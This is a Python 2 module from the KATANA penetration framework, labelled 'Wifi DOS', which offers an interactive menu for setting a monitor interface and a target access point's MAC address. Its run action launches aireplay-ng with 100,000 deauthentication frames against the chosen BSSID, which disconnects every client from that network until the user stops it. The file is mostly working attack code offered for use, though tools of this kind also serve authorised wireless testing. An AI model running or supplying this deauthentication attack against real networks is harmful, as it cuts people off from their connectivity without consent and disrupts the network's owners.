# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# @KATANA                    #
# Modules   : Wifi DOS       #
# Script by : RedToor        #
# Date      : 11/06/2015     #
# Version   : 2.0 BUilding   #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Katana Core                #
from core.design import *    #
from core.Setting import *   #
from core import Errors      #
from core import help        #
from core import ping        #
import sys                   #
d=DESIGN()                   #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Libraries                  #
import subprocess            #
import commands              #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Default                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
defaultint=INTERFACE_MONITOR
defaultmac=MAC_TARGET
# :-:-:-:-:-:-:-:-:-:-:-:-:- #

def run(card,monitor,mac,channel,essid):
	global defaultint,defaultmac
	defaultint=monitor
	defaultmac=mac
	ddos(1)


def ddos(run):
	global defaultint,defaultmac
	try:
		if run!=1:
			actions=raw_input(d.prompt("wifi/dos"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("device","yes","Interface",defaultint)
			d.descrip("bssid","yes","Mac Target",defaultmac)
			d.helpAUX()
			ping.interfaces(1)
			ping.monitor()
			d.space()
		elif actions[0:10] == "set device":
			defaultint=ping.update(defaultint,actions,"device")
			d.change("device",defaultint)
			ddos(0)
		elif actions[0:9] == "set bssid":
			defaultmac=ping.update(defaultmac,actions,"bssid")
			d.change("bssid",defaultmac)
		elif actions[0:5] == "start":
			start = actions[6:]
			print " "+Alr+" Starting Monitor Mode In "+start,ping.status_cmd("sudo airmon-ng start "+start,"\t\t\t")
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				if ping.checkDevice(defaultint):
					print " "+Alr+" Starting attack to "+defaultmac
					subprocess.call('aireplay-ng --deauth 100000 -a '+defaultmac+' '+defaultint, shell=True)
					stopAttack=raw_input(' '+Hlp+' Press Any Key for Stop the Attack.')
					subprocess.call("killall aireplay-ng", shell=True)
				else:
					d.NoDeviceFound(defaultint)
			except:
				Errors.Errors(event=sys.exc_info(), info=3)
		else:
			d.No_actions()
	except:
		Errors.Errors(event=sys.exc_info(), info=1)
	ddos(0)

